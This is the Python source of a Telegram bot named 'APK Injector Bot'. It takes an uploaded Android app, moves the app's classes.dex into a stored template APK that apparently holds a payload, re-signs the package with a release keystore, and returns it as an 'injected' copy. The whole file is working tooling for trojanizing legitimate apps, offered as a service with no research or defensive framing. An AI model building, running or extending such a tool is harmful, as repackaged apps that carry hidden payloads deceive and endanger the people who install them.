import os
import sys
import logging
import tempfile
import subprocess
import zipfile
import shutil
from pathlib import Path
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    stream=sys.stdout,
)
logger = logging.getLogger(__name__)

TOKEN = os.getenv("TELEGRAM_TOKEN", "").strip()

KEYSTORE_PATH = None
for path in ["/app/release.keystore", "./release.keystore"]:
    if os.path.exists(path):
        KEYSTORE_PATH = path
        break

KEYSTORE_PASS = os.getenv("KEYSTORE_PASS", "android").strip()

TEMPLATE_APK = None
for path in ["/app/template.apk", "./template.apk"]:
    if os.path.exists(path):
        TEMPLATE_APK = path
        break

logger.info(f"Template APK: {TEMPLATE_APK or 'NOT FOUND'}")


def check_tools():
    for tool in ["apktool", "jarsigner", "keytool"]:
        try:
            r = subprocess.run([tool], capture_output=True, timeout=10)
            logger.info(f"Tool OK: {tool}")
        except FileNotFoundError:
            logger.error(f"Tool MISSING: {tool} - WILL FAIL")
        except Exception as e:
            logger.info(f"Tool present: {tool} ({e})")


def run_cmd(cmd, label):
    logger.info(f"[{label}] Running: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    except subprocess.TimeoutExpired:
        logger.error(f"[{label}] TIMEOUT after 300s")
        return False
    if result.returncode != 0:
        logger.error(f"[{label}] FAILED (code {result.returncode})")
        if result.stdout:
            logger.error(f"[{label}] stdout: {result.stdout[:500]}")
        if result.stderr:
            logger.error(f"[{label}] stderr: {result.stderr[:500]}")
        return False
    logger.info(f"[{label}] OK")
    return True


def extract_apk(apk_path, dest_dir):
    with zipfile.ZipFile(apk_path, 'r') as z:
        z.extractall(dest_dir)


def create_apk(source_dir, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as apk:
        for root, dirs, files in os.walk(source_dir):
            for f in files:
                fp = os.path.join(root, f)
                arcname = os.path.relpath(fp, source_dir)
                apk.write(fp, arcname)


def inject_payload(apk_bytes):
    logger.info("=== INJECT START ===")
    
    if not TEMPLATE_APK:
        logger.error("Template APK not found!")
        return None
    
    logger.info(f"Template: {TEMPLATE_APK}")
    logger.info(f"Template exists: {os.path.exists(TEMPLATE_APK)}")
    logger.info(f"Template size: {os.path.getsize(TEMPLATE_APK) if os.path.exists(TEMPLATE_APK) else 0}")

    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp_path = Path(tmpdir)
            input_apk = tmp_path / "input.apk"
            final_dir = tmp_path / "final"
            output_apk = tmp_path / "output.apk"
            signed_apk = tmp_path / "signed.apk"

            with open(input_apk, "wb") as f:
                f.write(apk_bytes)
            logger.info(f"Original APK written: {len(apk_bytes)} bytes")

            logger.info("Extracting classes.dex from original APK...")
            dex_data = None
            with zipfile.ZipFile(str(input_apk), 'r') as z:
                for name in z.namelist():
                    if name == "classes.dex":
                        dex_data = z.read(name)
                        break

            if not dex_data:
                logger.error("No classes.dex found in original APK!")
                return None

            logger.info(f"Extracted classes.dex: {len(dex_data)} bytes")

            logger.info("Extracting template APK...")
            extract_apk(TEMPLATE_APK, str(final_dir))
            
            if not final_dir.exists():
                logger.error("Template extraction failed!")
                return None
            
            logger.info(f"Template extracted: {len(list(final_dir.rglob('*')))} files")

            logger.info("Replacing classes.dex...")
            dst_dex = final_dir / "classes.dex"
            if dst_dex.exists():
                dst_dex.unlink()
            dex_path = tmp_path / "classes.dex"
            with open(dex_path, "wb") as f:
                f.write(dex_data)
            shutil.copy2(str(dex_path), str(dst_dex))
            logger.info(f"classes.dex: {len(dex_data)} bytes")

            logger.info("Creating APK...")
            create_apk(str(final_dir), str(output_apk))
            logger.info(f"APK created: {os.path.getsize(output_apk)} bytes")

            if KEYSTORE_PATH:
                logger.info("Signing APK...")
                logger.info(f"Keystore: {KEYSTORE_PATH}")
                sign_ok = run_cmd(
                    [
                        "jarsigner",
                        "-keystore", KEYSTORE_PATH,
                        "-storepass", KEYSTORE_PASS,
                        "-keypass", KEYSTORE_PASS,
                        "-signedjar", str(signed_apk),
                        str(output_apk),
                        "release",
                    ],
                    "sign"
                )
                if sign_ok and signed_apk.exists():
                    logger.info(f"Signed APK: {os.path.getsize(signed_apk)} bytes")
                    with open(signed_apk, "rb") as f:
                        return f.read()
                else:
                    logger.error("Signing failed!")
            else:
                logger.error("No keystore found!")

            logger.warning("Returning unsigned APK")
            with open(output_apk, "rb") as f:
                return f.read()

    except Exception as e:
        logger.error(f"Inject error: {e}", exc_info=True)
        return None


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "APK Injector Bot\n\n"
        "Send an APK and I will inject the payload.\n\n"
        "Commands:\n"
        "/status - Check payload\n"
        "/help - Help"
    )


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if TEMPLATE_APK:
        await update.message.reply_text(f"Template APK: OK\nKeystore: {'OK' if KEYSTORE_PATH else 'NOT FOUND'}")
    else:
        await update.message.reply_text("Template APK not found!")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Help:\n\n"
        "/start - Start\n"
        "/status - Check payload\n"
        "/help - This message\n\n"
        "Send an APK file to inject the payload."
    )


async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document or not document.file_name.endswith(".apk"):
        await update.message.reply_text("Send a valid APK file!")
        return

    logger.info(f"APK received: {document.file_name} ({document.file_size} bytes)")
    status_msg = await update.message.reply_text("Downloading APK...")

    try:
        file = await context.bot.get_file(document.file_id)
        apk_data = await file.download_as_bytearray()
        logger.info(f"APK downloaded: {len(apk_data)} bytes")

        await status_msg.edit_text("Injecting payload... (may take a few minutes)")

        result = inject_payload(bytes(apk_data))

        if result:
            logger.info(f"Injection successful: {len(result)} bytes")
            await update.message.reply_document(
                document=result,
                filename=f"injected_{document.file_name}",
                caption="APK injected successfully!"
            )
        else:
            logger.error("Injection returned None!")
            await status_msg.edit_text("Error injecting payload!")

    except Exception as e:
        logger.error(f"Error: {e}", exc_info=True)
        await status_msg.edit_text(f"Error: {str(e)}")


def main():
    logger.info("=== Bot starting ===")
    logger.info(f"Python: {sys.version}")
    logger.info(f"TOKEN: {'SET' if TOKEN else 'NOT SET!'}")
    logger.info(f"Keystore: {KEYSTORE_PATH or 'NOT FOUND'}")
    logger.info(f"Template: {TEMPLATE_APK or 'NOT FOUND'}")
    check_tools()

    if not TOKEN:
        logger.error("TELEGRAM_TOKEN not set! Exiting.")
        sys.exit(1)

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))

    logger.info("Bot started! Waiting for messages...")
    app.run_polling()


if __name__ == "__main__":
    main()
